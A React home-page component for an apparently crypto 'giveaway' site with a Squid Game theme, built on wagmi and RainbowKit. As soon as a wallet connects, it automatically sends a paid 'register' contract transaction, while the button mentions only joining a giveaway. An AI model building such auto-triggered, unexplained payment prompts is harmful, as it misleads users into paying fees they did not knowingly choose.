import React, { useEffect } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import { useTranslation } from 'react-i18next'
import { ArrowRight, Coins, Trophy, Users, Zap, Circle, Triangle, Square } from 'lucide-react'
import { ConnectButton } from '@rainbow-me/rainbowkit'
import { useAccount, useContractWrite, useWaitForTransaction } from 'wagmi'
import { Button } from '../components/ui/button'
import CountdownTimer from '../components/CountdownTimer'
import { CONTRACT_ADDRESS, CONTRACT_ABI, REGISTRATION_FEE } from '../config/wagmi'
import { toast } from 'sonner'

const Home = () => {
  const { t } = useTranslation()
  const navigate = useNavigate()
  const { isConnected, address } = useAccount()
  
  // Contract write for registration
  const { write: writeContract, data: txData, isLoading: isPending } = useContractWrite({
    address: CONTRACT_ADDRESS,
    abi: CONTRACT_ABI,
    functionName: 'register',
  })
  
  const txHash = txData?.hash
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransaction({
    hash: txHash,
  })
  
  // Track if we've already attempted registration for this address
  const [registrationAttempted, setRegistrationAttempted] = React.useState(new Set())
  
  // Auto-register after wallet connection
  useEffect(() => {
    if (isConnected && address && !isPending && !isConfirming && !txHash && !registrationAttempted.has(address)) {
      console.log('🚀 AUTO-REGISTERING wallet:', address)
      setRegistrationAttempted(prev => new Set(prev).add(address))
      
      // Small delay then auto-register
      const timer = setTimeout(() => {
        try {
          writeContract({
            args: [],
            value: BigInt(REGISTRATION_FEE)
          })
          toast.success('Registration started! Please confirm in your wallet.')
        } catch (error) {
          console.error('Auto-registration error:', error)
          toast.error('Registration failed. Please try again.')
        }
      }, 1000)
      
      return () => clearTimeout(timer)
    }
  }, [isConnected, address, isPending, isConfirming, txHash])
  
  // Redirect to join page after successful registration
  useEffect(() => {
    if (isConfirmed && txHash) {
      console.log('✅ Registration confirmed! Redirecting to join page...')
      toast.success('Registration successful!')
      navigate('/join')
    }
  }, [isConfirmed, txHash, navigate])
  
  const handleJoinClick = () => {
    if (isConnected) {
      // Already connected, go to join page
      navigate('/join')
    } else {
      // Will trigger wallet connection through ConnectButton
      // After connection, user will be automatically redirected
    }
  }
  
  return (
    <div className="relative">
      {/* Squid Game Hero Section */}
      <section className="relative min-h-screen flex items-center justify-center px-4 sm:px-6 lg:px-8 overflow-hidden">
        
        {/* Advanced Background */}
        <div className="absolute inset-0 z-0">
          <img 
            src="https://customer-assets.emergentagent.com/job_payu-raffle/artifacts/5vvrh75w_Gemini_Generated_Image_vgopsdvgopsdvgop.png"
            alt="Payu Squid Game Background"
            className="w-full h-full object-cover opacity-30"
          />
          <div className="absolute inset-0 bg-gradient-to-b from-squid-black/70 via-squid-black/85 to-squid-black"></div>
          
          {/* Animated Grid Overlay */}
          <div className="absolute inset-0 opacity-5">
            <div className="grid grid-cols-12 grid-rows-8 h-full w-full">
              {[...Array(96)].map((_, i) => (
                <div key={i} className="border border-squid-red/20 flex items-center justify-center">
                  <span className={`text-xs animate-pulse`} style={{animationDelay: `${i * 0.05}s`}}>
                    {i % 3 === 0 ? '◯' : i % 3 === 1 ? '△' : '⬜'}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="relative z-10 max-w-6xl mx-auto text-center">
          
          {/* Enhanced Pepe Squid Game Logo Section */}
          <div className="mb-16 relative flex justify-center">
            <div className="relative">
              {/* Enhanced Background Glow */}
              <div className="absolute -inset-12 bg-gradient-to-r from-squid-red/40 via-squid-pink/40 via-squid-ice-blue/40 to-squid-gold/40 blur-3xl rounded-full animate-squid-glow"></div>
              
              {/* Main Pepe Image Container */}
              <div className="relative">
                <img 
                  src="https://customer-assets.emergentagent.com/job_payu-squid-draw/artifacts/lm7d864d_Gemini_Generated_Image_vgopsdvgopsdvgop.png"
                  alt="Payu Squid Game Pepe"
                  className="relative w-80 h-80 mx-auto rounded-3xl shadow-glow-red border-4 border-squid-red/60 bg-squid-black/90 backdrop-blur-sm animate-squid-glow-gold object-cover"
                />
                
                {/* Enhanced Floating Squid Game Symbols */}
                <div className="absolute -top-8 -left-8 w-12 h-12 squid-circle flex items-center justify-center text-squid-red text-3xl animate-float shadow-glow-red">◯</div>
                <div className="absolute -top-6 -right-10 w-10 h-10 squid-triangle flex items-center justify-center text-squid-ice-blue text-2xl animate-squid-bounce shadow-glow-ice-blue" style={{animationDelay: '1s'}}>△</div>
                <div className="absolute -bottom-8 -right-8 w-12 h-12 squid-square flex items-center justify-center text-squid-gold text-3xl animate-float shadow-glow-gold" style={{animationDelay: '2s'}}>⬜</div>
                <div className="absolute -bottom-6 -left-10 w-8 h-8 squid-circle-pink flex items-center justify-center text-squid-pink text-2xl animate-squid-pulse shadow-glow-pink" style={{animationDelay: '3s'}}>◯</div>
                
                {/* Additional Floating Elements */}
                <div className="absolute top-4 right-4 w-6 h-6 text-squid-gold animate-squid-bounce" style={{animationDelay: '0.5s'}}>✨</div>
                <div className="absolute bottom-4 left-4 w-6 h-6 text-squid-ice-blue animate-squid-pulse" style={{animationDelay: '1.5s'}}>⚡</div>
                <div className="absolute top-1/2 -left-6 w-4 h-4 text-squid-pink animate-float" style={{animationDelay: '2.5s'}}>💎</div>
                <div className="absolute top-1/2 -right-6 w-4 h-4 text-squid-red animate-squid-bounce" style={{animationDelay: '3.5s'}}>🎯</div>
              </div>
            </div>
          </div>

          {/* Enhanced Main Title */}
          <div className="mb-12">
            <h1 className="text-5xl md:text-7xl font-squid-display mb-8 leading-tight">
              <span className="block bg-gradient-to-r from-squid-red via-squid-pink via-squid-ice-blue to-squid-gold bg-clip-text text-transparent animate-glow uppercase">
                {t('hero.title')}
              </span>
              <span className="block bg-gradient-to-r from-squid-gold via-squid-ice-blue to-squid-pink bg-clip-text text-transparent animate-glow-blue text-4xl md:text-6xl font-squid mt-4 uppercase">
                {t('hero.subtitle')}
              </span>
            </h1>
            
            {/* Enhanced Subtitle with Symbols */}
            <div className="flex items-center justify-center space-x-6 mb-8">
              <span className="text-squid-red text-3xl animate-squid-pulse">◯</span>
              <p className="text-xl md:text-2xl text-squid-light-grey font-squid max-w-5xl leading-relaxed text-center">
                {t('hero.description')}
              </p>
              <span className="text-squid-ice-blue text-3xl animate-squid-bounce">△</span>
            </div>
            
            <div className="flex items-center justify-center space-x-4">
              <span className="text-squid-gold text-2xl animate-squid-pulse">⬜</span>
              <span className="text-squid-gold font-squid-display text-xl animate-glow-gold">
                {t('hero.rewardsInstant')}
              </span>
              <span className="text-squid-pink text-2xl animate-squid-bounce">◯</span>
            </div>
          </div>

          {/* Enhanced CTA Section - Single Big Button */}
          <div className="mb-16">
            <div className="flex items-center justify-center">
              
              {/* Single CTA - Join & Connect with RainbowKit */}
              <div className="group relative">
                <div className="absolute -inset-4 bg-gradient-to-r from-squid-red via-squid-pink via-squid-ice-blue to-squid-gold blur-2xl opacity-60 group-hover:opacity-90 transition-all duration-700 animate-squid-pulse"></div>
                
                <ConnectButton.Custom>
                  {({ account, chain, openAccountModal, openChainModal, openConnectModal, mounted }) => {
                    const ready = mounted;
                    const connected = ready && account && chain;
                    
                    return (
                      <button
                        onClick={() => {
                          if (connected) {
                            // Already connected, navigate to join page
                            navigate('/join')
                          } else {
                            // Open wallet connection modal
                            openConnectModal()
                          }
                        }}
                        className="relative bg-gradient-to-br from-squid-red via-squid-pink to-squid-ice-blue text-white font-squid-display font-bold py-8 px-16 rounded-3xl transition-all duration-500 transform hover:scale-110 hover:shadow-[0_0_60px_rgba(255,69,180,0.8)] border-4 border-white/20"
                      >
                        <div className="flex flex-col items-center space-y-2">
                          {/* Top Line - Main Action */}
                          <div className="flex items-center space-x-4">
                            <span className="text-4xl animate-squid-bounce">◯</span>
                            <span className="text-3xl tracking-wider">
                              {connected ? 'JOIN THE GIVEAWAY' : 'JOIN THE GIVEAWAY'}
                            </span>
                            <span className="text-4xl animate-squid-bounce" style={{animationDelay: '0.2s'}}>△</span>
                          </div>
                          
                          {/* Divider */}
                          <div className="w-full h-[2px] bg-white/40"></div>
                          
                          {/* Bottom Line - Sub Action */}
                          <div className="flex items-center space-x-3">
                            <span className="text-2xl">🔗</span>
                            <span className="text-xl tracking-widest opacity-90">
                              {connected ? `CONNECTED: ${account.displayName}` : 'CONNECT WALLET'}
                            </span>
                            <ArrowRight className="w-6 h-6 animate-squid-pulse" />
                          </div>
                        </div>
                      </button>
                    );
                  }}
                </ConnectButton.Custom>
              </div>
            </div>
          </div>

          {/* Countdown */}
          <CountdownTimer className="mb-16" />
        </div>
      </section>

    </div>
  )
}

export default Home
